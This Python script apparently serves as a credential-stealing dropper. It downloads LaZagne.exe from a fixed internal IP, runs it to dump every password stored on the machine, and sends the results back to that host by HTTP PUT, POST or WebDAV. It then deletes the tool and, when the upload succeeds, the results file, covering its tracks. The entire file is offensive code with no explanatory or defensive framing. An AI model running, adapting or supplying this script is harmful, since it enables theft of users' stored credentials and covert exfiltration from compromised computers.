#!/usr/bin/env python
import requests, subprocess, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def upload_file_direct(file_path, server_url):
    """Upload file directly to Apache2 server using PUT method"""
    try:
        filename = os.path.basename(file_path)
        # Create unique filename with timestamp
        import time
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        unique_filename = f"{timestamp}_{filename}"
        
        upload_url = f"{server_url}/{unique_filename}"
        
        with open(file_path, 'rb') as f:
            response = requests.put(upload_url, data=f)
            if response.status_code in [200, 201, 204]:
                return True
            else:
                return False
    except Exception as e:
        return False

def upload_data_post(data_content, server_url):
    """Upload data content directly via POST without PHP"""
    try:
        import time
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"result_{timestamp}.txt"
        
        # Send as raw POST data
        headers = {
            'Content-Type': 'text/plain',
            'Content-Disposition': f'attachment; filename="{filename}"'
        }
        
        response = requests.post(f"{server_url}/{filename}", 
                               data=data_content, 
                               headers=headers)
        
        if response.status_code in [200, 201, 204]:
            return True
        else:
            return False
    except Exception as e:
        return False

def upload_file_webdav(file_path, server_url):
    """Upload using WebDAV method"""
    try:
        filename = os.path.basename(file_path)
        import time
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        unique_filename = f"{timestamp}_{filename}"
        
        upload_url = f"{server_url}/{unique_filename}"
        
        with open(file_path, 'rb') as f:
            headers = {'Content-Type': 'application/octet-stream'}
            response = requests.put(upload_url, data=f, headers=headers)
            return response.status_code in [200, 201, 204]
    except Exception as e:
        return False

temp_directory = tempfile.gettempdir() # file will be downloaded in the temp directory
os.chdir(temp_directory)

download("http://192.168.11.111/files/LaZagne.exe")
result = subprocess.check_output(["LaZagne.exe", "all"], shell=True)

# Save result to file
result_file = "result.txt"
result_data = result.decode('utf-8', errors='ignore')
with open(result_file, "w") as f:
    f.write(result_data)

# Try multiple upload methods
server_url = "http://192.168.11.111/files"  # Direct to files directory
success = False

# Method 1: Direct file upload via PUT
success = upload_file_direct(result_file, server_url)

# Method 2: POST data directly (no file needed)
if not success:
    success = upload_data_post(result_data, server_url)

# Method 3: WebDAV method
if not success:
    success = upload_file_webdav(result_file, server_url)

# Clean up based on upload success
if success:
    # Upload successful - delete both files
    os.remove("LaZagne.exe")
    os.remove(result_file)
else:
    # Upload failed - keep result.txt in temp, only delete LaZagne.exe
    os.remove("LaZagne.exe")
